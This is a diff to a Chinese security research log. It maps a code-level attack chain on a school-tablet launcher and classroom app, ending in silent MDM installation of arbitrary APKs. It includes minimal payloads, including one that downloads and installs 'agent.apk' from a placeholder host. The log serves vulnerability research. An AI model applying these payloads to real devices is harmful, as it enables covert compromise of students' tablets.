@@ -100,3 +100,125 @@
 | 严重崩溃导致初始化被跳过 | 设备启动无任何修复/安全页；且正常启动路径会在延时后清除崩溃标志 |
 
 因此该环节的验证需要一个**不依赖业务消息本身**的外部可观测探针，例如：利用注册应答中的 `clientId` 变化触发接收器内的客户端注册请求（该请求会产生真实网络行为）。相关探针已实现，等待执行结论。
+
+## 2026-11-08 代码级复核：字段级契约与不依赖推送的触发路径
+
+### 一、第二条触发路径（不需要推送消息）
+
+首页数据检查回调 `HomeViewModel.afterCheckData()` 的执行顺序：
+
+1. `checkAppUpdate$default(...)` — 触发 `requestAfterLogin`
+2. `doRules()`
+3. `getCheckDataEntity().getAssist()` 非空 → `JsonUtil.objToJson(assist)` → `AssistModel.sendAssistMessage(json)`
+4. `checkFontConfig()` → `LocationHelper.start()`
+
+`CheckDataEntity` 来自 `AccountRemoteDataSource.requestAfterLogin`：
+`GET %s/api/v2/pub/platform/users/{userId}/afterLogin`，其中 `%s = UrlCache.getHttpUrl()`。
+
+`UrlCache.getHttpUrl()` → `getAddressList("SA106003")`（服务类型 `LAUNCHER`）：
+优先取 `SessionData.reloadAccountInfo().getMicroAddressDTOList()`（登录响应下发），
+为空时回退 `Configuration.getHttpUrlArray()`。
+
+结论：只要该基址落在研究者可控的明文 HTTP 主机上，`afterLogin` 响应中带 `assist`
+字段即可在**首页加载时零交互**拉起协助会话，与第 4–6 环（推送下行）完全解耦。
+
+### 二、字段级契约（本轮复核新增）
+
+| 环节 | 代码事实 |
+| --- | --- |
+| 协助通知解析 | `AssistNotify.parseJsonObject`：只读 `id`（`optString`，默认空串）与 `hidden`（`optInt`，默认 0），并把 `operate` 强制置为 `"ENTRY"` |
+| 最小会话载荷 | `/assists` 响应返回 `{"id":"assist_x","hidden":1}` 即触发 ENTRY（`hidden=1` 抑制浮层） |
+| 会话由响应驱动 | `AssistManager$requestAssist$1.onNext(String)`：非空 → `new JSONObject(json)` → `AssistNotify.parseJsonObject` → `JsonUtil.objToJson` → `AssistManager.sendAssistMessage(...)` |
+| 任务列表解析 | `AssistModelImpl$2.preNext(String)`：`new JSONArray(json)`，逐项读 `id` / `instruction` / `step`（`optInt` 默认 1），补 `userId`、`deviceId` 后入 `TaskAsyncAuto` |
+| 脚本执行 | `AssistModelImpl$2$1.onExecute(TaskEntity)`：`ZAZELexer(instruction)` → `ZAZEParser` → `MyVisitor.visit(prog())` → `AssistTaskResult` → `upAssistResult(...)` |
+| 任务最小载荷 | `[{"id":"t1","instruction":"installAppOnline(\"http://<host>/agent.apk\")","step":1}]` |
+
+### 三、安装腿（逐段确认为 MDM 静默安装）
+
+`AssistFunc.installAppOnline(url)`
+→ 路径 `DOWNLOAD_APP_DIR/assist/<md5(url)>.apk`
+→ `DownloadManager.download(url, path, null, callback)`
+→ `AssistFunc$installAppOnline$1.onSuccess`
+→ `PolicyManager.getApplicationPolicyProxy().installApplication(path)`
+→ `MdmHolder`
+→ `com.xuehai.system.mdm.action_aidl`（MDM 服务）
+→ 静默安装，无安装确认界面。
+
+
+---
+
+## 主链分级（2026-11-13 定稿）
+
+在「基址为 HTTPS」前提下，把既有链路重新分为两条主链：**A 为第一主链**（最可靠），B 为备用/控制面。
+
+### A. 课堂明文 WebSocket → 自动下载 → 7z native 解压越界（第一主链）
+
+选它的四条理由：①课堂 WS 是明文且现场劫持成功过（`Auth` 头明文、应答 accept 正常）；②不依赖 HTTPS 基址、盒子自检、`SysAuthority.getPreDownloadApp()`、推送接收器；③服务端下行即触发，无需点击；④解压走 native，Java 层无 `../` 规范化。
+
+| # | 跳 | 代码位置 |
+| --- | --- | --- |
+| 1 | 课堂 WS 建连与分发 | `HandleSocketMsgService.smali`（`ServerMessage{cId,cmd,smsg}`，`cmd=0xa/0xb` 教师上下线走 `ContextMessage.sendMsg`） |
+| 2 | 下载动作落点 | `StudentDeskTopActivity.smali:5971-5985`（`"action_socket_download_ppt_resource"` → `presenter.autoDownLoadRes`） |
+| 3 | 资源存在性判断 / 触发下载 | `StudentDeskTopPresenter.smali:1462 autoDownLoadRes` → `:359 checkAudioResExit` → `StartServiceHelper.smali:1996 startDownLoadPptService` |
+| 4 | 下发下载 Intent | `StartServiceHelper.smali:1721-1845`（action `download_ppt_action`，extras `taskId`/`resourceId`/`desktopId`） |
+| 5 | 资源元数据 | `ResourceHelper.smali:1160-1270`：`/api/v4/resource/single?appSubType=&sourceId=&userId=&sourceUrl=`，基址 = `XHMicroServer.getActualIp("SA104009")` |
+| 6 | 下载执行 | `StuFtpManager.smali:640-800`（`0xc351` 注入的 `address+rootPath+"/"+tag+"/"+name`）或 `HttpBaseDownload` → `BoxServer` → `FileService.download("/box/file?url=b64")` |
+| 7 | 解压 | `ResourceHelper.smali:627 doHandDownLoadSuccess` → `needDecode`（7z 后缀）→ `Z7Extractor.smali:93 extractFile` → native `nExtractFile:173` |
+| 8 | 越界出口 | `/mnt/sdcard/xhproxy/<加密名>`（`HttpRequest.<clinit>` → `checkProxy` → `JNISetProxy`，零校验）/ `/sdcard/xuehai/config/*.ini` / `/sdcard/xuehai/app/<pkg>/<ver>/<pkg>.apk` |
+| 9 | 收尾 | 代理劫持 launcher 出网；或预置 APK + 任务行 → `AppInstallManager.installApp` → `installApplication(savePath)` → MDM AIDL 静默安装 |
+
+**未闭合的一跳**：第 2 跳的触发侧——`action_socket_download_ppt_resource` 目前只在 `ResourceDownLoadService$1`（下载完成后）见到发送点，`smsg.type → autoDownLoadRes / StartServiceHelper` 的映射尚待钉死。
+
+### B. 明文微服务表投毒（备用 / 控制面）
+
+`http://ms.yunzuoye.net/api/v2/pub/microServer/list/`（`XHMicroServerV2.smali:28-53`）→ `parseMicroUrl`（要求数组，key = 纯 `serverType`）→ `URL_MAP` / MMKV → `AddressLoader.formatUrl` 强制补 `http://` ⇒ `SA104009` / `SA106003` / `SB103013` 全部指向研究者主机。
+
+用途：为 A 提供伪造 `ResourceInfo.zipUrl`、给 launcher 降级服务地址、盒子自检回 `xh`。
+
+**为何不能作第一主链**：`RoleJudgmentHelper.isBaiFenYunApp()`（`RoleJudgmentHelper.smali:171-177`）为 `const/4 v0,0x0` 硬编码 false，`AutoDownloadManager.checkPreDownload()`（`:733`）因此永不触发 ⇒ 该链只能控制「下载内容/地址」，不能自动发起下载。
+
+---
+
+## 定稿 v3（2026-11-13）：主链 A 逐跳表（21 跳，代码级）
+
+> 本表取代此前所有"候选链"表述。链 A 的入口是**课堂 App 的明文 WebSocket**，出口是**launcher 的 MDM 静默安装**。中间借助"7z native 无路径过滤"完成从"固定目录写"到"任意路径写"的放大，再借助"launcher 主库位于共享存储"完成从"文件写"到"安装任务注入"的放大。
+
+| # | 跳 | 应用 | 代码位置 | 门禁 | 判据 |
+| --- | --- | --- | --- | --- | --- |
+| 01 | WS 收帧 | C | `smali_classes3/com/xh/ws/sockethelper/StudentWebSocketHelper$2.smali` | 无（明文 TCP 8889） | 抓包 |
+| 02 | 帧转服务 | C | `smali_classes9/com/xh/business_module/socketmsg/HandleSocketMsgService.smali` | 无 | 代码 |
+| 03 | 按 tag 路由 | C | `smali_classes9/com/xh/business_module/app/BusinessApp.smali`（注册表） | 字符串比较 | 代码 |
+| 04 | canvas 处理器 | C | `.../socketmsg/MessageHandleForCanvasHelper.smali`（`canvas_tag`） | 无 | 代码 |
+| 05 | type=3 解析 | C | 同上（`GsonUtil.fromJson(PhraseInfo)` → `ContextMessage.sendMsg`） | 无 | 代码 |
+| 06 | 事件派发 | C | `ContextMessage.smali`（`activityList` → `BaseActivity.onMsgEvent`） | Activity 存活 | 代码 |
+| 07 | 桌面接收 | C | `smali_classes2/com/xh/studesktop/ui/impl/StudentDeskTopActivity.smali` | 无 | 代码 |
+| 08 | Presenter | C | `.../studesktop/presenter/impl/StudentDeskTopPresenter.smali`（`playPhrase`） | 仅判空 | 代码 |
+| 09 | 下载服务 | C | `.../business_module/pushmsgservice/DownLoadPhraseService.smali` | 无 | 代码 |
+| 10 | URL 组装 | C | `smali_classes10/com/xh/ftp/StuFtpManager.smali`（`getFileUrl` / `downloadNormal`） | 无 | 代码 |
+| 11 | HTTP 下载 | C | `smali_classes9/com/xh/common/http/HttpBaseDownload.smali` | 无 | 代码 |
+| 12 | 下载完成 | C | `.../resourcehelper/ResourceHelper.smali`（`doHandDownLoadSuccess`） | 文件非空 | 代码 |
+| 13 | 判解压 | C | `smali_classes9/com/xh/communits/FilePathCheckToos.smali`（`needDecode`） | 7z 后缀 | 代码 |
+| 14 | native 解压 | C | `smali_classes7/com/hzy/lib7z/Z7Extractor.smali` → `libun7zip.so` | 无 `../` 过滤 | 静态分析 |
+| 15 | 越界落盘 | FS | 由 7z 条目名决定 | 外部存储写权限 | 待真机 |
+| 16 | 库路径 | L | `smali_classes3/com/xuehai/launcher/data/db/MyDaoMaster$1.smali` | `isSdcardEnable()` | 代码 |
+| 17 | 库打开 | L | `.../data/db/BaseLocalDataSource.smali`（`xh_launcher.db`） | `user_version=96` | 代码 |
+| 18 | 任务拾取 | L | `.../application/data/AppLocalDataSource.smali`（`status != 0x65`） | 行存在 | 代码 |
+| 19 | 首页触发 | L | `.../home/HomeViewModel$checkAppUpdate$1.smali` → `updateAllApps` | 首页加载 | 代码 |
+| 20 | 批量执行 | L | `.../application/util/AppUpdateManager.smali`（`executeAppUpdateTask`） | `0x20` 默认授予 | 代码 |
+| 21 | 下载+安装 | L | 同上（`pushDownloadTask` → `downloadAndInstall` → `addToInstallPool`） | 包名/版本号 | 代码 |
+| 22 | 静默安装 | L | `.../application/util/AppInstallManager.smali` → `ApplicationPolicyProxy.installApplication` | 无签名校验 | 代码 |
+| 23 | MDM | 系统 | `MdmHolder` → AIDL `com.xuehai.system.mdm.action_aidl` | 服务存在 | 代码 |
+
+### 触发前提（唯一的非代码前提）
+
+链 A 需要一个"已运行的课堂 App 进程且持有 8889 长连接"。实测：设备空闲时该连接不存在（120 秒内设备仅有 3200 推送流量）；此时唯一可控入口是让课堂 App 建立连接（`course://com.xh.smartclassstu/open?...` 深链或一次课堂界面操作）。
+
+### 已排除的入口（同一版本实测）
+
+| 入口 | 结论 |
+| --- | --- |
+| 3200 推送五类消息（`app-notification`/`app-upgrade`/`app-upgrade-prepare`/`app-syncMessage`/`control-service`/`assist-notify`） | 全部 ACK，30–40 秒内零下游连接 |
+| `LauncherPushService` 注册 | 未注册（`payload=null` 崩溃探针未触发进程崩溃） |
+| launcher exported 广播 `LauncherReceiver` | 需本机发射者，网络侧无法投递 |
+| 课堂 App 的 service/receiver | 全部 `exported=false`；`CONNECTIVITY_CHANGE` 仅发本地消息 |
+| 控制 Provider / 明文 HTTP body / Tinker / OTA / HTTPS MITM | 逐条代码级否证（见 `docs/STATUS.md`） |
